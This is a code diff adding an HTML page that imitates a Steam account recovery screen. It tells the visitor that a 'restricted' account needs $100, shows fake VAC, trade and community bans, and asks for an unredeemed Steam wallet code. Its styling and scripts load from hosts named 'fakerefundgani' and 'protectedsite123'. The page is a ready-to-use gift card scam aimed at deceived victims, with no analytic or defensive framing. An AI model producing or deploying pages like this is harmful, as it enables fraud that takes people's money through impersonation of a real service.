@@ -1,0 +1,98 @@
+<html lang="en"><head>
+<meta charset="UTF-8">
+<title>Account Recovery Option</title>
+<link rel="stylesheet" href="https://fakerefundgani.vercel.app/boyshitka.css">
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="page-title">
+<img src="https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg">
+Steam Recovery Option
+</div>
+
+<div class="main">
+
+<!-- Left Image -->
+
+<div class="giftcard_leftcol">
+				<img style="width: 390px;height:auto;max-width: 100%;" src="https://store.cloudflare.steamstatic.com/public/images/gift/steamcards_cards_02.png">
+			</div>
+
+
+<!-- Right Side -->
+
+<div class="right">
+
+<div class="section-title">Recovery:</div>
+<div class="info-text" id="recoveryText">
+<b>This account requires $100 to Generate a new Billing Transaction ID. We will put it on the user-panel to gather the account's data for restoration.</b>
+</div>
+
+
+<div class="inputbox">
+<div class="block_header">Steam Wallet Code:</div>
+
+<div class="wallet-row">
+
+<input id="walletCode" type="text" placeholder="Enter Steam Wallet Code">
+
+<span id="steamPopup" class="steam-popup">
+   Activated Successfully!
+</span>
+
+</div>
+
+<div class="note">NOTE: Please ensure that the Steam wallet code has not been redeemed.</div>
+
+<button onclick="showPopup()">Activate Code</button>
+</div>
+
+
+<div class="account">
+
+<div class="account-box">
+<div class="avatar">
+    <img src="https://avatars.fastly.steamstatic.com/51d8c7336601d89371029df5072f219a1a188fdd_full.jpg">
+</div>
+
+<div>
+<b>Account: </b>Mogalsio_<br>
+
+<span class="wallet-balance">
+Wallet Balance: <span id="fundsText" class="balance-amount">$0</span>
+</span><br>
+<small>(ID: 783266662189909)</small>
+</div>
+
+</div>
+
+<!-- MOVED BANNED STATUS HERE -->
+ <br>
+<div class="account-status">
+<div class="info-size">Community Banned: <span id="communityBan" class="ban-red">Banned</span></div>
+<div class="info-size">Trade Banned: <span id="tradeBan" class="ban-red">Banned</span></div>
+<div class="info-size">VAC Banned: <span id="vacBan" class="ban-red">Banned</span></div>
+<div class="info-size">Account Status: <span id="accountStatus" class="ban-red">Restricted</span></div>
+</div>
+
+<button id="recoverBtn" onclick="recoverAccount()" disabled>
+Recover Account</button>
+<div class="progress-container" id="progressBox">
+    <div class="progress-bar" id="progressBar">0%</div>
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+</div>
+
+<script src="https://fakerefundgani.vercel.app/boyshitkascript.js"></script>
+<script type="module" src="https://protectedsite123.vercel.app/Protectedsite.js"></script>
+
+</body></html>
